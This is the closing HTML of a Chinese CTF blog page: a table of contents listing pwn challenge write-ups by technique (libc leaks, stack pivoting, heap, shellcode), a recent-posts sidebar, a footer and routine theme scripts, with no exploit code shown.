class="toc-number">2.27.</span> <span class="toc-text">[HarekazeCTF2019]baby_rop 2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8read%E5%87%BD%E6%95%B0%E6%B3%84%E9%9C%B2libc%E5%9F%BA%E5%9D%80"><span class="toc-number">2.27.1.</span> <span class="toc-text">利用read函数泄露libc基址</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn2-sctf-2016"><span class="toc-number">2.28.</span> <span class="toc-text">pwn2_sctf_2016</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA-printf%E5%87%BD%E6%95%B0libc%E7%89%88%E6%9C%AC%E6%B3%84%E9%9C%B2"><span class="toc-number">2.28.1.</span> <span class="toc-text">整数溢出+printf函数libc版本泄露</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#picoctf-2018-rop-chain"><span class="toc-number">2.29.</span> <span class="toc-text">picoctf_2018_rop chain</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#jarvisoj-level3"><span class="toc-number">2.30.</span> <span class="toc-text">jarvisoj_level3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ez-pz-hackover-2016"><span class="toc-number">2.31.</span> <span class="toc-text">ez_pz_hackover_2016</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ciscn-2019-s-3"><span class="toc-number">2.32.</span> <span class="toc-text">ciscn_2019_s_3</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#32%E4%BD%8D%E4%B8%8E64%E4%BD%8D%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">2.32.1.</span> <span class="toc-text">32位与64位系统调用的区别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%EF%BC%9Acsu%E5%92%8Csrop%E3%80%81sigret"><span class="toc-number">2.32.2.</span> <span class="toc-text">方法：csu和srop、sigret</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8"><span class="toc-number">2.32.3.</span> <span class="toc-text">系统调用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#wustctf2020-getshell"><span class="toc-number">2.33.</span> <span class="toc-text">wustctf2020_getshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#jarvisoj-level3-x64"><span class="toc-number">2.34.</span> <span class="toc-text">jarvisoj_level3_x64</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#babyheap-0ctf-2017"><span class="toc-number">2.35.</span> <span class="toc-text">babyheap_0ctf_2017</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A0%86%E9%A2%98"><span class="toc-number">2.35.1.</span> <span class="toc-text">堆题</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mrctf2020-shellcode"><span class="toc-number">2.36.</span> <span class="toc-text">mrctf2020_shellcode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bjdctf-2020-babyrop2"><span class="toc-number">2.37.</span> <span class="toc-text">bjdctf_2020_babyrop2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%B3%84%E9%9C%B2Canary%EF%BC%8Cputs%E5%87%BD%E6%95%B0%E6%B3%84%E9%9C%B2libc%E7%89%88%E6%9C%AC"><span class="toc-number">2.37.1.</span> <span class="toc-text">格式化字符串泄露Canary，puts函数泄露libc版本</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bjdctf-2020-router"><span class="toc-number">2.38.</span> <span class="toc-text">bjdctf_2020_router</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#jarvisoj-level4"><span class="toc-number">2.39.</span> <span class="toc-text">jarvisoj_level4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#picoctf-2018-buffer-overflow-1"><span class="toc-number">2.40.</span> <span class="toc-text">picoctf_2018_buffer overflow 1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwnable-orw"><span class="toc-number">2.41.</span> <span class="toc-text">pwnable_orw</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%B4%E6%98%AF%E6%9C%89%E7%97%85%E6%AF%92%EF%BC%8C%E6%94%BE%E7%9D%80"><span class="toc-number">2.41.1.</span> <span class="toc-text">说是有病毒，放着</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#inndy-rop"><span class="toc-number">2.42.</span> <span class="toc-text">inndy_rop</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#jarvisoj-test-your-memory"><span class="toc-number">2.43.</span> <span class="toc-text">jarvisoj_test_your_memory</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ZJCTF-2019-EasyHeap"><span class="toc-number">2.44.</span> <span class="toc-text">[ZJCTF 2019]EasyHeap</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A0%86%E9%A2%98-1"><span class="toc-number">2.44.1.</span> <span class="toc-text">堆题</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#hitcontraining-uaf"><span class="toc-number">2.45.</span> <span class="toc-text">hitcontraining_uaf</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A0%86%E9%A2%98-2"><span class="toc-number">2.45.1.</span> <span class="toc-text">堆题</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PicoCTF-2018-buffer-overflow-2"><span class="toc-number">2.46.</span> <span class="toc-text">PicoCTF_2018_buffer_overflow_2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cmcc-simplerop"><span class="toc-number">2.47.</span> <span class="toc-text">cmcc_simplerop</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#wustctf2020-getshell-2"><span class="toc-number">2.48.</span> <span class="toc-text">wustctf2020_getshell_2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mrctf2020-easyoverflow"><span class="toc-number">2.49.</span> <span class="toc-text">mrctf2020_easyoverflow</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bbys-tu-2016"><span class="toc-number">2.50.</span> <span class="toc-text">bbys_tu_2016</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xdctf2015-pwn200"><span class="toc-number">2.51.</span> <span class="toc-text">xdctf2015_pwn200</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#write%E5%87%BD%E6%95%B0%E6%B3%84%E9%9C%B2libc%E7%89%88%E6%9C%AC%EF%BC%8Cread%E5%87%BD%E6%95%B0%E6%BA%A2%E5%87%BA"><span class="toc-number">2.51.1.</span> <span class="toc-text">write函数泄露libc版本，read函数溢出</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ciscn-2019-s-4"><span class="toc-number">2.52.</span> <span class="toc-text">ciscn_2019_s_4</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%88%E8%BF%81%E7%A7%BB-1"><span class="toc-number">2.52.1.</span> <span class="toc-text">栈迁移</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#wustctf2020-closed"><span class="toc-number">2.53.</span> <span class="toc-text">wustctf2020_closed</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#stdout%E9%87%8D%E5%AE%9A%E5%90%91%E3%80%82"><span class="toc-number">2.53.1.</span> <span class="toc-text">stdout重定向。</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ZJCTF-2019-Login"><span class="toc-number">2.54.</span> <span class="toc-text">[ZJCTF 2019]Login</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#jarvisoj-level1"><span class="toc-number">2.55.</span> <span class="toc-text">jarvisoj_level1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#read%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E-write%E5%87%BD%E6%95%B0%E6%B3%84%E9%9C%B2libc%E5%9F%BA%E5%9D%80"><span class="toc-number">2.55.1.</span> <span class="toc-text">read函数漏洞,write函数泄露libc基址</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#hitcontraining-magicheap"><span class="toc-number">2.56.</span> <span class="toc-text">hitcontraining_magicheap</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#picoctf-2018-shellcode"><span class="toc-number">2.57.</span> <span class="toc-text">picoctf_2018_shellcode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#axb-2019-fmt32"><span class="toc-number">2.58.</span> <span class="toc-text">axb_2019_fmt32</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%BC%E5%BC%8F%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9B%B2%E6%89%93"><span class="toc-number">2.58.1.</span> <span class="toc-text">格式字符串盲打</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#others-babystack"><span class="toc-number">2.59.</span> <span class="toc-text">others_babystack</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ciscn-2019-s-9"><span class="toc-number">2.60.</span> <span class="toc-text">ciscn_2019_s_9</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B1%87%E7%BC%96%E4%BB%A3%E7%A0%81%E5%86%99shellcode"><span class="toc-number">2.60.1.</span> <span class="toc-text">汇编代码写shellcode</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#gyctf-2020-borrowstack"><span class="toc-number">2.61.</span> <span class="toc-text">gyctf_2020_borrowstack</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%88%E8%BF%81%E7%A7%BB-2"><span class="toc-number">2.61.1.</span> <span class="toc-text">栈迁移</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwnable-start"><span class="toc-number">2.62.</span> <span class="toc-text">pwnable_start</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#hitcontraining-heapcreator"><span class="toc-number">2.63.</span> <span class="toc-text">hitcontraining_heapcreator</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A0%86%E9%A2%98%E3%80%82"><span class="toc-number">2.63.1.</span> <span class="toc-text">堆题。</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ciscn-2019-n-3"><span class="toc-number">2.64.</span> <span class="toc-text">ciscn_2019_n_3</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A0%86%E9%A2%98-3"><span class="toc-number">2.64.1.</span> <span class="toc-text">堆题</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#jarvisoj-level5"><span class="toc-number">2.65.</span> <span class="toc-text">jarvisoj_level5</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#write%E5%87%BD%E6%95%B0%E6%B3%84%E9%9C%B2libc%E5%9F%BA%E5%9D%80%EF%BC%8Cread%E5%87%BD%E6%95%B0%E6%BA%A2%E5%87%BA"><span class="toc-number">2.65.1.</span> <span class="toc-text">write函数泄露libc基址，read函数溢出</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#babyfengshui-33c3-2016"><span class="toc-number">2.66.</span> <span class="toc-text">babyfengshui_33c3_2016</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwnable-hacknote"><span class="toc-number">2.67.</span> <span class="toc-text">pwnable_hacknote</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ciscn-2019-es-7"><span class="toc-number">2.68.</span> <span class="toc-text">ciscn_2019_es_7</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#picoctf-2018-got-shell"><span class="toc-number">2.69.</span> <span class="toc-text">picoctf_2018_got_shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#roarctf-2019-easy-pwn"><span class="toc-number">2.70.</span> <span class="toc-text">roarctf_2019_easy_pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A0%86%E9%A2%98-4"><span class="toc-number">2.70.1.</span> <span class="toc-text">堆题</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#actf-2019-babystack"><span class="toc-number">2.71.</span> <span class="toc-text">actf_2019_babystack</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%88%E8%BF%81%E7%A7%BB-3"><span class="toc-number">2.71.1.</span> <span class="toc-text">栈迁移</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Not-Bad"><span class="toc-number">2.72.</span> <span class="toc-text">[极客大挑战 2019]Not Bad</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ORW"><span class="toc-number">2.72.1.</span> <span class="toc-text">ORW</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ciscn-2019-es-1"><span class="toc-number">2.73.</span> <span class="toc-text">ciscn_2019_es_1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A0%86%E9%A2%98-5"><span class="toc-number">2.73.1.</span> <span class="toc-text">堆题</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#picoctf-2018-leak-me"><span class="toc-number">2.74.</span> <span class="toc-text">picoctf_2018_leak_me</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#suctf-2018-basic-pwn"><span class="toc-number">2.75.</span> <span class="toc-text">suctf_2018_basic pwn</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cmcc-pwnme1"><span class="toc-number">2.76.</span> <span class="toc-text">cmcc_pwnme1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#wustctf2020-easyfast"><span class="toc-number">2.77.</span> <span class="toc-text">wustctf2020_easyfast</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A0%86%E9%A2%98-6"><span class="toc-number">2.77.1.</span> <span class="toc-text">堆题</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cmcc-pwnme2"><span class="toc-number">2.78.</span> <span class="toc-text">cmcc_pwnme2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mrctf2020-easy-equation"><span class="toc-number">2.79.</span> <span class="toc-text">mrctf2020_easy_equation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2-1"><span class="toc-number">2.79.1.</span> <span class="toc-text">格式化字符串</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mrctf2020-shellcode-revenge"><span class="toc-number">2.80.</span> <span class="toc-text">mrctf2020_shellcode_revenge</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#picoctf-2018-can-you-gets-me"><span class="toc-number">2.81.</span> <span class="toc-text">picoctf_2018_can_you_gets_me</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/05/22/Android-CTF/" title="Android-CTF"><img src="https://z-bosh.github.io/img/Android2.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Android-CTF"/></a><div class="content"><a class="title" href="/2025/05/22/Android-CTF/" title="Android-CTF">Android-CTF</a><time datetime="2025-05-22T00:00:00.000Z" title="发表于 2025-05-22 00:00:00">2025-05-22</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/05/20/%E5%88%9D%E8%AF%86Android/" title="初识Android"><img src="https://z-bosh.github.io/img/Android1.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="初识Android"/></a><div class="content"><a class="title" href="/2025/05/20/%E5%88%9D%E8%AF%86Android/" title="初识Android">初识Android</a><time datetime="2025-05-20T00:00:00.000Z" title="发表于 2025-05-20 00:00:00">2025-05-20</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/05/02/Android%E9%80%86%E5%90%91/" title="Android逆向"><img src="https://z-bosh.github.io/img/Android.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Android逆向"/></a><div class="content"><a class="title" href="/2025/05/02/Android%E9%80%86%E5%90%91/" title="Android逆向">Android逆向</a><time datetime="2025-05-02T00:00:00.000Z" title="发表于 2025-05-02 00:00:00">2025-05-02</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/03/26/shellcode%E5%92%8C%E5%8A%A0%E8%BD%BD%E5%99%A8/" title="shellcode和加载器"><img src="https://z-bosh.github.io/img/kill.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="shellcode和加载器"/></a><div class="content"><a class="title" href="/2025/03/26/shellcode%E5%92%8C%E5%8A%A0%E8%BD%BD%E5%99%A8/" title="shellcode和加载器">shellcode和加载器</a><time datetime="2025-03-26T00:00:00.000Z" title="发表于 2025-03-26 00:00:00">2025-03-26</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/03/20/%E5%B5%8C%E5%85%A5%E5%BC%8F%E8%AE%BE%E5%A4%87%E5%90%8E%E9%97%A8%E4%B8%8Eshellcode%E7%94%9F%E6%88%90%E5%B7%A5%E5%85%B7/" title="嵌入式设备后门工具的利用"><img src="https://z-bosh.github.io/img/leak3.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="嵌入式设备后门工具的利用"/></a><div class="content"><a class="title" href="/2025/03/20/%E5%B5%8C%E5%85%A5%E5%BC%8F%E8%AE%BE%E5%A4%87%E5%90%8E%E9%97%A8%E4%B8%8Eshellcode%E7%94%9F%E6%88%90%E5%B7%A5%E5%85%B7/" title="嵌入式设备后门工具的利用">嵌入式设备后门工具的利用</a><time datetime="2025-03-20T00:00:00.000Z" title="发表于 2025-03-20 00:00:00">2025-03-20</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/img/background.jpg);"><div id="footer-wrap"><div class="copyright">&copy;2022 - 2025 By bosh</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"><script>(() => {
  const runMermaid = ele => {
    window.loadMermaid = true
    const theme = document.documentElement.getAttribute('data-theme') === 'dark' ? 'dark' : 'default'

    ele.forEach((item, index) => {
      const mermaidSrc = item.firstElementChild
      const mermaidThemeConfig = `%%{init:{ 'theme':'${theme}'}}%%\n`
      const mermaidID = `mermaid-${index}`
      const mermaidDefinition = mermaidThemeConfig + mermaidSrc.textContent

      const renderFn = mermaid.render(mermaidID, mermaidDefinition)
      const renderMermaid = svg => {
        mermaidSrc.insertAdjacentHTML('afterend', svg)
      }

      // mermaid v9 and v10 compatibility
      typeof renderFn === 'string' ? renderMermaid(renderFn) : renderFn.then(({ svg }) => renderMermaid(svg))
    })
  }

  const codeToMermaid = () => {
    const codeMermaidEle = document.querySelectorAll('pre > code.mermaid')
    if (codeMermaidEle.length === 0) return

    codeMermaidEle.forEach(ele => {
      const preEle = document.createElement('pre')
      preEle.className = 'mermaid-src'
      preEle.hidden = true
      preEle.textContent = ele.textContent
      const newEle = document.createElement('div')
      newEle.className = 'mermaid-wrap'
      newEle.appendChild(preEle)
      ele.parentNode.replaceWith(newEle)
    })
  }

  const loadMermaid = () => {
    if (false) codeToMermaid()
    const $mermaid = document.querySelectorAll('#article-container .mermaid-wrap')
    if ($mermaid.length === 0) return

    const runMermaidFn = () => runMermaid($mermaid)
    btf.addGlobalFn('themeChange', runMermaidFn, 'mermaid')
    window.loadMermaid ? runMermaidFn() : btf.getScript('https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js').then(runMermaidFn)
  }

  btf.addGlobalFn('encrypt', loadMermaid, 'mermaid')
  window.pjax ? loadMermaid() : document.addEventListener('DOMContentLoaded', loadMermaid)
})()</script></div><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
POWERMODE.shake = true;
POWERMODE.mobile = false;
document.body.addEventListener('input', POWERMODE);
</script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-show-text.min.js" data-mobile="false" data-text="Rweb,Pwn,Reverse,Linux,CTF,heap,stack" data-fontsize="15px" data-random="false" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>